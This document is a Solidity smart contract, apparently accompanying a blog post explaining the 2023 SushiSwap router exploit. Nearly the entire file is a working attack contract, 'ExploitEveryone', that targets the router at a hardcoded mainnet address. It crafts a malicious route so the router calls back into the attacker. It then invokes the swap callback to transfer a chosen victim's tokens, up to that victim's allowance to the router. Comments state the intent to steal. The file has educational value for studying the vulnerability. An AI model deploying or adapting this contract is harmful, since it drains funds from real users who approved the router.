// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import "hardhat/console.sol";

// Interface for getting USDC tokens from Uniswap for ETH
interface UniswapV2RouterLike {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

// https://etherscan.io/address/0x044b75f554b886a065b9567891e45c79542d7357#code
// The sushiSwap function that we want to call. 
interface sushiSwapLike{
  function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
  ) external payable returns (uint256 amountOut); 


  // Callback function from the pool that we want to hit
  function uniswapV3SwapCallback (
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data) external;
}


/*
SushiSwap exploit code.
For more details, read https://maxwelldulin.com/BlogPost/sushiswap-exploit-explained-2023.
*/
contract ExploitEveryone{

  // Contract we want to exploit
  sushiSwapLike sushiRouter = sushiSwapLike(0x044b75f554b886A065b9567891e45c79542d7357); 
  address public victim;
  address public victimToken;
  bool public called = false;

  function attack(address token, address _victim) external{
    victim = _victim; 
    victimToken = token;

    // Main parameters for the 'processRoute' function
    address tokenIn = victimToken;       // Must be a valid ERC20 token
    uint256 amountIn = 1;         // Greater than 0 for sanity checks
    address tokenOut = victimToken;      // Must be a valid ERC20 token
    uint256 amountOutMin = 1;     // Don't care about value
    address to = address(this);   // Don't care aout value

    /*
    Route construction
    -----------------------------
    Command code:
    - Type of swap to perform
    - 4 - use 'processOnePool' function 
    - uint8 (1 byte) 
    TokenIn: 
    - Address of the token to trade
    - Content doesn't matter
    - address (20 bytes) 
    Pool Code:
    - uniswapV3 pool
    - 1 - call uniswapV3 function 
    - uint8 (1 byte) 
    Uniswap Pool
    - The address of the uniswap pool. For our exploit, this is a malicious contract to exploit the callback.
    - address(this) 
    - address (20 bytes) 
    Zero For One
    - Ticks for uniswapv3. Not entirely sure what this parameter is for.
    - 0 or 1 - doesn't matter
    - boolean (1 byte)
    recipient
    - The address that should receive the funds from the trade
    - Does not matter
    - address (20 bytes) 
    */
    bytes memory route = abi.encodePacked(uint8(4), address(this), uint8(1), address(this), true, address(this));

    // Attacking payload
    sushiRouter.processRoute(
      tokenIn,
      amountIn, 
      tokenOut, 
      amountOutMin, 
      to, 
      route);
  }


  /*
  Function that we **trick** the router to call for us.
  */
  function swap(
    address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data
  ) external returns (int256 amount0, int256 amount1){


    // Get all of the funds for our victim user that are stealable by checking the 'userBalance' and 'routerAllowance'.
    uint256 userBalance = IERC20(victimToken).balanceOf(address(victim)); 
    uint256 routerAllowance = IERC20(victimToken).allowance(victim, address(sushiRouter));
    int256 value0 = int256(userBalance > routerAllowance ? routerAllowance : userBalance); 

    int256 value1 = -1; 
    console.log("Value 0: %s", uint256(value0)); 
    console.log("Value userBalance: %s", userBalance); 
    console.log("Value routerAllowance: %s", routerAllowance); 

    // usdc is the token we want to steal
    // victim is the 'address' we want to steal the funds from
    bytes memory route = abi.encode(victimToken, victim);

    // Send the data... claim other persons USDC through a bad approval
    sushiRouter.uniswapV3SwapCallback(value0, value1, route); 
  }

  // Get balances of our current user and victim for the token
  function getBalances(address token, address a, address b) external view returns (uint256, uint256){
    IERC20 tokenContract = IERC20(token);
    uint256 val1 = tokenContract.balanceOf(a);
    uint256 val2 = tokenContract.balanceOf(b); 

    return (val1, val2);
  }
}